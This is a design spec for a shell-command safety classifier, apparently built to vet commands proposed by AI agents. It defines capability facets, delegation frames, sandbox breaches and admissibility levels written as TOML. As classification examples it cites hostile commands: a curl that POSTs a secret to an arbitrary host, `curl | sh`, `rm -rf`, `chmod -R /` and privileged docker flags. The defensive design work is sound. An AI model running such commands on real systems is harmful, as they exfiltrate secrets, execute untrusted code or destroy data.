# Behavioral Capability Model — spec v1.1 (canonical)

Status: canonical draft (2026-07-03). Consolidates the design series into one
reviewable spec. Supersedes the *model* in `behavioral-taxonomy-v1.md` and folds
in the pilot's revisions (R1–R7) plus delegation, isolation, supply-chain, and
information-flow. The deep-dive docs remain **reference annexes** for their
exhaustive catalogs (see §8). Not yet implemented.

---

## 1. The model

- **Command-form** — a specific invocation shape: base command + a path of
  subcommands + the flags present + the shapes of positional arguments.
  `git push --force`, `git status`, `git config user.name x` are three forms of
  `git`.
- **Capability** — one thing a command-form can do, described as a point in the
  taxonomy (§2): an *operation* plus values on the applicable *facets*.
- **Behavior profile** — the *set* of capabilities a command-form exhibits. The
  unit we store and reason about; most commands have several.
- **Facet** — one orthogonal dimension of the taxonomy, with a small, fixed,
  operationally-defined vocabulary.
- **Safety level** — a named **admissibility predicate** over facet-space (§4). A
  profile *passes* iff every capability in it lies in the level's admissible
  region. Levels are data; users can author their own.

```
invocation ──parse & resolve──▶ behavior profile (set of capabilities)
                                        │
             safety level L ────────────┼──▶ admit?  (every capability ∈ L's region
             (a predicate)              │            AND the flow policy holds)
                                        ▼
                             allow · prompt · deny
```

**Allowlist-only invariant (unchanged).** A command with no profile is
*unclassified* and never auto-approved. Any unresolved delegation, argument, or
facet resolves to its worst term. The taxonomy only enriches the *approved* side;
it never approves something undescribed.

---

## 2. The taxonomy — facets

Twelve facets in six groups. Two are **compound** (Network, Execution). Ordinal
facets are listed low→high severity; each term carries a **discriminator** (the
operational test vs its neighbors). Exhaustive term examples live in the golden-set
(§5) and annexes (§8).

### 2.1 The act

**Operation** (categorical; exactly one per capability):
`observe` · `create` · `mutate` · `destroy` · `execute` · `communicate` ·
`configure` (change settings that alter *future* commands) · `authorize` (change
credentials/trust/access) · `control` (start/stop/signal processes, services,
devices). `configure`/`authorize` are split from `mutate` because their danger is
the downstream effect, not the write.

### 2.2 Reach — what/where/how-much/with-what-privilege

**Locus** (ordinal): `process` → `temp` (`/tmp`, `/dev/null`, `$TMPDIR`) →
`sandbox-scope` (inside a confirmed sandbox, §3.2) → `worktree` (cwd data files) →
`worktree-trusted` (project files another tool auto-executes/trusts: `.git/`,
`.envrc`, hooks, CI configs) → `user` (home dotfiles, `~/.config`, `~/.ssh`,
keychain) → `machine` (`/etc`, services, other users, root-owned) → `remote`
(another host/device).

**Scale** (ordinal): `single` → `bounded` (a glob, a directory, an explicit list)
→ `unbounded` (recursion / mass op: `rm -rf`, `find -exec`, `chmod -R /`).

**Authority** (ordinal): `user` → `elevated` (`sudo`/`doas`/`pkexec`) → `root` →
`other-user` (setuid / run-as). Gates whether `user`/`machine`-locus effects
actually land; it is the frame a privilege delegator applies (§3.1).

**Isolation** (ordinal strength): `none` → `view` (`chroot`: fs-view only, root
escapes — not a boundary) → `namespace` (containers) → `userns`
(rootless/`bwrap`) → `vm` (gVisor/Kata) → `ocap` (deny-by-default: `wasmtime`,
`pledge`/`unveil`). An isolation frame *clamps* nested locus to `sandbox-scope`;
**breach flags re-add loci** (§3.2). Containment is credited only when confirmed.

### 2.3 Durability

**Reversibility** (ordinal): `none` (pure observe) → `trivial` (idempotent / has
undo) → `recoverable` (from VCS/recycle/snapshot) → `effortful` (only from
out-of-band backups) → `irreversible` (`--force`, secure-delete, remote
destruction). Environment-dependent cases resolve worst-case (§3.3).

**Persistence** (ordinal): `transient` → `data` (durable data-only) →
`reconfiguring` (changes settings that alter future commands: `git config
core.pager`, PATH, `jj config set`) → `installing` (adds/removes executables,
services, hooks, cron, startup items). P2/P3 are why a *local* write can exceed
its locus in danger.

### 2.4 Information exposure

**Disclosure** (ordinal — the audience): `none` → `local-process` (data reaches
stdout → the agent/model provider sees it) → `local-persistent` (readable by
other local users) → `trusted-remote` (a specific endpoint you configured) →
`shared-remote` (collaborators/tenant can read) → `public` (world-readable).

**Secret** (ordinal): `none` → `uses-ambient` (relies on present credentials) →
`reads` (private keys, tokens, password stores) → `writes` (creates/rotates) →
`transmits` (sends secret material out).

### 2.5 Channel

**Network** (compound — a point in three sub-axes, each small and defined):
- *Direction*: `none` · `loopback` · `outbound` · `inbound-listen`
- *Destination*: `n/a` · `fixed` (tool-set or literal) · `arbitrary`
  (argument-controllable — the exfil/SSRF severity discriminator)
- *Payload*: `none` · `fetches` (pulls data in) · `sends-host-data` (pushes local
  data out)

`curl https://api/health` = outbound·fixed·fetches; `curl -X POST -d @secret
https://$H` = outbound·arbitrary·sends. The "six levels of network" are points in
this grid — many, each nameable.

### 2.6 Code provenance

**Execution** (compound). Local code by trust: `none` → `self` → `caller-inline`
(`bash -c`, `ruby -e` — the human typed it) → `caller-file` (interpreter runs a
named script) → `ambient-config` (Makefile/hooks/`.envrc`/plugins — code not on
the command line: the self-escalation surface) → `network-sourced` (fetched over
the network). When `network-sourced`, decompose into **supply-chain sub-facets**:
- *source*: `unverified-url` · `public-registry` · `signed-repo` ·
  `private-registry` · `vendored`
- *pinning*: `floating` · `version` · `hash-verified` (lockfile/`--require-hashes`/
  `go.sum`) · `digest`
- *exec-surface*: `none` (download only) · `install-hook` (npm/pip-sdist/dpkg) ·
  `build-script` (`build.rs`, node-gyp, cgo) · `call-time` (Go's model) ·
  `run-artifact`

This grid is what lets a `developer` level accept `cargo build`/`go build`/`npm ci
--ignore-scripts` while rejecting `curl | sh` — each admit/reject citing a named
fact (annex: `delegation`).

### 2.7 Resource

**Cost** (ordinal): `none` → `local-resource` → `metered` (billable/paid) →
`quota` (rate limits / seats). Usually `none`; populated for provisioning tools
(`terraform apply`, `gcloud compute … create`).

### 2.8 The capability record

```
capability {
  operation: mutate
  locus: remote            reversibility: recoverable   persistence: data
  scale: bounded           authority: user              isolation: none
  disclosure: shared-remote                     secret: uses-ambient
  network: { direction: outbound, destination: fixed, payload: sends-host-data }
  execution: self          cost: none
  delegate: <nested profile> | none            # §3.1
  because: "updates refs on the configured remote over SSH; --force -> irreversible"
  evidence: { source: "git-push(1)", url: "...", researched_version: "git 2.53" }
}
```
Facets not listed default to their zero term.

---

## 3. Mechanisms

Facets describe one capability; these mechanisms compose capabilities and connect
commands.

### 3.1 Delegation (`frame ∘ nested-profile`)

A delegating capability runs a nested computation whose behavior is the real
risk. It carries a **frame** and a **nested profile** that is either *resolved*
(parse and classify the inner command) or **opaque** (unknown → worst-case). Six
frame kinds and their transforms (annex: `delegation`, `isolation`):

| frame | commands | transform |
|---|---|---|
| transparent | `bash -c`, `timeout`, `env`, `xargs`, `find -exec` | identity (env-with-`LD_PRELOAD`/`PATH` adds `reconfiguring`) |
| privilege | `sudo`, `doas`, `su -c` | `authority := elevated/root` on the nested profile |
| remote | `ssh host CMD`, `docker exec`, `kubectl exec` | nested locus → `remote`; intrinsic outbound network |
| isolation | `docker run`, `firejail`, `bwrap`, `wasmtime` | clamp nested locus to `sandbox-scope`, then re-add breach loci (§3.2) |
| interpreter | `python -c`, `psql -c`, `node -e` | nested = the language's behavior; opaque by default |
| task-runner | `make`, `npm run`, `just` | nested = project-config code (`ambient-config`); opaque unless the recipe is parsed |

**Resolution** re-enters the classifier on the nested command line; frames
compose (`sudo ssh h 'CMD'` = privilege ∘ remote). Real nesting is shallow, so
resolution simply runs to completion; an inner command that can't be parsed is
opaque → worst-case, like any unresolved delegation. Note where the real
compounding lives, and where it does *not*: cross-command chaining (`a && b | c`)
is **not** delegation — it is handled upstream by per-segment chain evaluation,
each segment classified independently; **fan-out** (`xargs`, `find -exec`,
`-exec {} +`) is captured by the **Scale** facet (`unbounded`) on the delegating
capability. Neither needs a recursion bound.

### 3.2 Isolation strength & breaches

An isolation frame is **capability reduction**; breaches are **re-grants**.
Containment is *earned*: only clamp nested locus when the sandbox is confirmed and
no breach/unknown flag is present. Breach catalog (annex: `isolation`):
`-v HOST:CT` → re-add `classify_locus(HOST)`; `-v …docker.sock` → host root;
`--privileged`/`--cap-add=SYS_ADMIN` → `machine`+root; `--pid=host` → host process
control; `--network=host` → host network. Standing note: *being able to run
docker at all* implies latent `machine`+root.

### 3.3 Argument resolution & worst-case

Several facets are functions of argument values: **Locus, Secret, Disclosure
audience, Network destination, Scale**. A resolution pass maps argument shapes →
facet values via classifiers (`classify_locus(path)` — generalizes the shipped
`is_safe_write_target`/`PositionalShape`; `classify_destination(url)`). **Rule:
any value that can't be pinned (`$VAR`, glob, stdin) takes the facet's worst
term**, and the assumption is recorded in `because`. This is the same posture
already shipping for redirect targets.

### 3.4 Information flow

Safety is often a property of *flows*, not single commands. The shell's data
edges are visible in the CST (pipes, `$()`, redirects, procsubs, vars), so the
flow analysis is reachability over that graph (annex: `information-flow`,
`flow-engine`). **The facets are the labels:** confidentiality source = `secret`;
confidentiality sink = `disclosure`/outbound network; integrity source =
execution/supply-chain provenance; integrity sink = `execute`/`configure`.
`declassifier`/`endorser` capabilities (`gpg -e`, `sha256`, `verify`) make an
otherwise-forbidden flow admissible.

Doctrine (asymmetry, stated honestly):
- **Integrity flows are prevented** — untrusted→exec is intra-line-visible and
  complete (`curl|bash`, `eval`, redirect-to-hook). This is what safe-chains
  *already* enforces; the model unifies it.
- **Confidentiality flows are detected and elevated** — within a line by the
  static pass, across observed-file calls by **session taint** (a protected,
  hook-written `{path → label}` store — statelessness resolved by externalizing
  the summary, §6). Not a guarantee across unobserved copies/sessions; a
  principled reduction of the invisible surface.

---

## 4. Safety levels

A level is an **admissible region** in facet-space. Structurally it is a
disjunction of **clauses**; each clause is a conjunction of per-facet constraints
— a ceiling (`≤`) on an ordinal facet, a membership set on a categorical one —
plus a **flow policy** (two toggles: forbid `secret`→outbound-send; forbid
low-integrity→exec). A capability is admissible if *some* clause admits it; a
profile passes iff every capability is admissible **and** the flow policy holds.
This is the allowlist principle one floor up: safe-chains allowlists command
shapes; a level allowlists *behavior* shapes.

### 4.1 A level is TOML data

Levels are data, not Rust — the discipline the command corpus already follows
("handlers are for logic, not data"). Three primitives express every level,
conditional supply-chain grants included, with no bespoke code:

- `facet = "<= term"` — an ordinal ceiling.
- `facet = ["a","b"]` — a categorical membership set.
- `extends = "other"` — inherit another level's clauses, then add more.

```toml
[level.write-local]
operation     = ["observe", "create", "mutate"]
locus         = "<= worktree"        # excludes worktree-trusted/user/machine/remote
reversibility = "<= recoverable"
persistence   = "<= data"            # excludes reconfiguring/installing
scale         = "<= bounded"
network       = "none"
execution     = "<= caller-inline"
authority     = "user"
flow          = { low_integrity_exec = "forbid", secret_outbound = "forbid" }

[level.developer]
extends = "write-local"
[[level.developer.allow]]            # a carve-in clause; unions with the inherited region
operation    = ["execute"]
execution    = "<= network-sourced"
supply_chain = { source = ["public-registry", "signed-repo", "private-registry", "vendored"],
                 pinning = ">= version", exec_surface = "<= build-script" }
```

Every carve-out the current engine hand-patches falls out of these clauses:
`is_safe_write_target`'s denials are just `locus > worktree` or
unresolvable-locus→worst-case (§3.3); write-flag escalation is a modifier that
adds a `create`/`mutate` capability.

### 4.2 The proptest contract

The ceiling/set shape makes the level engine provable, not merely tested
(type-directed generation over `Profile`, each facet an enum):

1. **Facet-monotonicity** — take an admitted profile, make any one facet *less*
   severe; it must stay admitted. Catches the worst bug class — a level that
   admits a worse behavior yet rejects a strictly-better one. A level that fails
   this is incoherent by construction; this is what makes "never arbitrary"
   *enforceable*, not aspirational.
2. **`extends` ⇒ superset** — if B only adds clauses to A, `admit(A) ⊆ admit(B)`.
3. **Totality** — every profile gets allow/deny; no undefined facet, no panic.
4. **Round-trip** — TOML → predicate → TOML.
5. **Anchor** — generated profiles agree with a reference on the golden-set.

### 4.3 The default set

The shipped levels are designed in `behavioral-taxonomy-levels.md` (Stage 3):
`inert ⊂ read-local ⊂ write-local ⊂ developer`, with a **contained-mode** sibling
(isolation may instead be a *modifier* on any level — open, see `hard-problems`).
Today's flat `SafeWrite` allow-set is an **impact baseline** to measure against,
not a spec to reproduce: divergences are deliberate, logged as
`intended-tightening` or `unacceptable-breakage`, not treated as regressions.

**User-defined levels** are the end-state: a user drops a `[level.*]` table,
delivered through the trusted-config model from v0.205.0 and validated by the same
proptest contract.

### 4.4 Resolution depth — a level demands only what it needs

A capability can be described at increasing **resolution**: coarse (cheap, always
available) to fine (expensive, sometimes impossible). Resolution is *epistemic* —
how much we know — distinct from a facet's severity. A level's predicate
implicitly names the resolution it needs to decide, and the analyzer resolves
**lazily**, only as deep as some active clause references. Where the needed
resolution is unavailable — no parser for a payload language, an unpinnable
argument — the facet takes its **worst term** and the clause fails: the
allowlist floor, unchanged.

This is the guarantee that safe-chains **need not become a universal interpreter.**
The same fact is describable coarsely or finely, and a level chooses. For a
payload-bearing command (`kubectl apply -f`, `psql -c`; see
`behavioral-taxonomy-payload-frame`), three coarse postures cover most levels
without parsing a byte of the payload language:

- **payload-forbid** — "no payload delegation at all." Decides at the coarsest
  resolution: *is there a payload?*
- **payload-blind allow** — "a payload from a trusted source is fine, contents
  irrelevant." Decides at presence + source integrity.
- **payload-aware** — "I must know the verb / selector / body." Descends to the
  payload grammar; if no resolver exists for that language, it denies rather than
  guesses.

Deep payload grammars are therefore built **incrementally**, only for the
`(language, level)` pairs that demand that depth; their absence denies safely
instead of blocking progress. Most levels stop at the coarse postures. The
principle generalizes past payloads — every facet has a cheap coarse reading and a
costlier precise one — but payloads are where it earns its keep, because it is the
difference between a library of optional resolvers and a universal parser.

---

## 5. Non-arbitrariness protocol

*Many* levels, never an arbitrary one — enforced structurally:
1. **Named, never numbered.** A facet term is admissible only with a definition, a
   **discriminator** (the test vs its neighbors), and ≥2 examples (one positive,
   one negative near-miss). No `N3`.
2. **Every classification cites its discriminator** in a `because` string. A record
   without one is invalid.
3. **Evidence mandatory**: `source` + `url` + `researched_version`. Replaces the
   free-text `description` with per-capability, queryable justification.
4. **Classification golden-set** — a frozen corpus of invocations with expected
   facet values (seeded by the pilot's 20; annex `pilot`). Any taxonomy change must
   keep it classifiable and re-review the diffs.
5. **Adding a term requires a demonstrated gap** — a real command-form the current
   vocabulary can't express (same bar as new TOML primitives today).

The taxonomy's *shape* is also non-arbitrary: the facets recapitulate protection
theory (CVSS metrics, POLA, ocap, confused deputy, Denning's IFC — annex
`safety-foundations`).

---

## 6. Engine, data, and program

**Profile-resolution engine** (safe-chains side). Capabilities attach to grammar
nodes; a node is **additive** (adds a capability), **modifier** (transforms
facets: `--dry-run` → all `observe`; `--force` → `irreversible`; `-R` →
`unbounded`; `-o FILE`/redirect → retarget locus by `classify_locus(FILE)`), or
**gating** (a flag unlocks a capability). The engine unions additive capabilities,
applies modifiers in a pinned order, resolves argument-derived facets (§3.3),
resolves delegation (§3.1), builds the CST dataflow graph, then evaluates the
active level's predicate + flow policy.

**The capability registry** (its own project). Owns the schema
(`tool → node → capabilities[]`), the taxonomy/level/golden-set data, the
delegator/breach/supply-chain catalogs, validation (`because` + evidence +
golden-set green), and a **compiler** that emits the artifact safe-chains links.
The compiled artifact is the contract; safe-chains becomes a consumer. Reusable
beyond safe-chains (the CLI-design DB and the book derive from the same store —
annex `safety-foundations` §5).

**Staged roadmap.**
- Stage 0–2 — **done**: model, pilot, deep-dives, this consolidation.
- **Stage 3 (in progress)** — level design (`behavioral-taxonomy-levels.md`):
  the five default levels as TOML clauses (§4.1); measure against today as an
  impact baseline, not a regression target; grow the golden-set. Level *contents*
  wait on a better-understood data model (`hard-problems`).
- Stage 4 — engine: profile resolution + predicate/flow evaluation behind a flag;
  run old vs new over the corpus and diff.
- Stage 5 — migrate the corpus incrementally (un-migrated commands fall back to
  the legacy tier via an `unclassified` bridge).
- Stage 6 — extract the registry project; safe-chains consumes the artifact.
- Stage 7 — user-defined levels + session-taint store.

---

## 7. Decisions resolved here vs deferred

**Resolved in v1.1:**
- Canonical facet set = the twelve in §2 (Network and Execution compound).
- Network split into Direction × Destination × Payload; kept distinct from
  Disclosure (channel vs audience).
- Cost is **in** as a minor facet.
- Authority and Isolation are first-class facets; Delegation and Information-flow
  are mechanisms, not facets.
- `sandbox-scope` added to Locus. Delegation resolves fully (nesting is shallow);
  compounding is handled by chain segmentation and the Scale facet, not a
  recursion bound.
- Doctrine: prevent integrity flows, detect+elevate confidentiality flows.

**Deferred to Stage 3+:**
- The exact level contents (`developer`, `contained-mode`/isolation-as-modifier,
  `write-local` thresholds) — wait on a better-understood data model.
- Golden-set contents beyond the pilot seed.
- The compiled-artifact format and the registry↔safe-chains contract details.
- Per-language interpreter payload sub-models (SQL etc.) — opaque by default for
  now.

## 8. Reference annexes

Depth for their catalogs, subordinate to this spec's model:
`behavioral-taxonomy-levels` (Stage 3: the default levels) ·
`behavioral-taxonomy-pilot` (golden-set seed, R1–R7) ·
`behavioral-taxonomy-pilot2` (tree-heavy conversion, R8–R15) ·
`behavioral-taxonomy-pilot3` (novel behaviors, R16–R23) ·
`behavioral-taxonomy-payload-frame` (the config/API frame, decomposed) ·
`…-delegation` (frame
algebra, supply-chain ecosystem table) · `…-isolation` (strength ladder, breach
catalog) · `…-information-flow` + `…-flow-engine` (flow analysis, session taint) ·
`safety-foundations` (theory grounding, the four-artifact program) ·
`hard-problems` (running log of unresolved gaps) · `reading-list` (bibliography).
